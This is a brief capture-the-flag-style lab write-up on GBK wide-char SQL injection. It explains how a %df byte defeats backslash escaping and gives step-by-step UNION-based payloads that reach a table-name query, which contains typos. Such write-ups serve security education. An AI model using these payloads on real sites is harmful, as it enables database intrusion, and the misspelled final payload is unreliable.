# Lab 6.3.1 SQL Wide-Char-Based Injection

## 0x00 Basic Knowledge

Lots of non-English countries are using different charset besides unicode (utf-8). For example, in China, gbk is still very popular among some CMS or sites. 

However, different charset may need different number of bytes to store them.

- utf8 3 bytes
- gbk 2 bytes

### Issue Causes

So when some sites using different charsets for backend and database, for example PHP (utf-8) and MySQL (gbk), some vulnerabilities may occur for wide char injection.

```sql
SET NAMES 'gbk'
```

which inculdes the following

```sql
SET character_set_client = gbk;
SET character_set_results = gbk;
SET character_set_connection = gbk;
```

### magic_quotes_gpc

When magic_quotes_gpc is ON, it may add "\" in front of most of the special characters

- '
- "
- \
- NULL

for all POST, GET, COOKIE etc input variables.

### Injection

In order to bypass additional \, we need to inject more payload to remove that backslash.

In gbk, \ is represent as %5c and '運' is%df%5c,we can add addition %df to eliminate the backslash.

## 0x01 Go Hack It

Lab site from [zkaq.org][1]

### [Home Page][2]

![](./imgs/0_home.jpg)

### Injection Point

```sql
id=1'%23
```

![](./imgs/1_bs.png)

```sql
id=1%df' %23
```

![](./imgs/1_df.png)

So we got an unknown char here.

### Field Number

```sql
id=1%df' ORDER BY 1,2,3%23
```

![](./imgs/2_field_num.png)

Works with 1,2,3 not 4. So only 3 fields are needed.

### Display Location

```sql
id=1。111%df' UNION SELECT 1,2,3%23
```

![](./imgs/3_display.png)

### TABLE_NAME

```sql
id=1.111%df' UNION SELECT 1,2,TABLE_NAME FROM INFORMATION_SCHEMA WHERE TABLE_SCHEMA=DATABSE()%23
```

[1]: https://hack.zkaq.org/?a=battle&f=target&id=ed4870a359baa0dd
[2]: http://120.203.13.75:8150/New/WidecharBased/RankOne/sql-one/
